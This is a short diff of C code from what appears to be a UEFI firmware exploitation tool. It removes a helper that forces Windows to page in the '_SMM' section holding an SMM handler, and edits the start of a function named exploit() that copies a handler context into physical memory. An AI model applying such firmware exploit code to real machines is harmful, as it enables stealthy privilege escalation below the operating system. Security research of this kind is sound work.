@@ -432,21 +432,6 @@ _end:
     return ret;
 }
 //--------------------------------------------------------------------------------------
-#pragma optimize("", off)
-
-static void smm_image_section_workaround(void)
-{
-    /*
-        smm_handler() and other functions that being executed in SMM
-        are stored in separate executable image section "_SMM". Windows
-        will copy contents of this section into the physical memory only 
-        after the first access to it's virtual memory pages.
-    */
-    unsigned char foo = *(unsigned char *)&smm_handler;
-}
-
-#pragma optimize("", on)
-//--------------------------------------------------------------------------------------
 int exploit(int target, PUEFI_EXPL_TARGET custom_target, PSMM_HANDLER_CONTEXT context, unsigned int context_size, bool quiet)
 {
     int ret = -1;
@@ -457,9 +442,7 @@ int exploit(int target, PUEFI_EXPL_TARGET custom_target, PSMM_HANDLER_CONTEXT co
         context_size = sizeof(SMM_HANDLER_CONTEXT);
     }
 
-    context->status = -1;
-
-    smm_image_section_workaround();
+    context->status = -1;    
 
     // copy SMM_HANDLER_CONTEXT to continious physical memory buffer
     if (uefi_expl_mem_alloc(context_size, &addr, &phys_addr))
